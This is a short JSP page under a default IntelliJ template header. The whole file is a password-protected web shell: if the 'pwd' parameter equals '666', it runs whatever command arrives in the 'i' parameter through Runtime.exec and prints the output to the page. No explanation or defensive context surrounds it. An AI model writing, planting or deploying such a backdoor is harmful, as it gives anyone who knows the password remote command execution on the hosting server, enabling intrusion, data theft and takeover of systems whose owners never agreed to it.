<%--
  Created by IntelliJ IDEA.
  User: 59302
  Date: 2022/12/12
  Time: 12:03
  To change this template use File | Settings | File Templates.
--%>
<%
    if ("666".equals(request.getParameter("pwd"))) {
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        out.print("<pre>");
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            out.println(s);
        }
        out.print("</pre>");
    }
%>
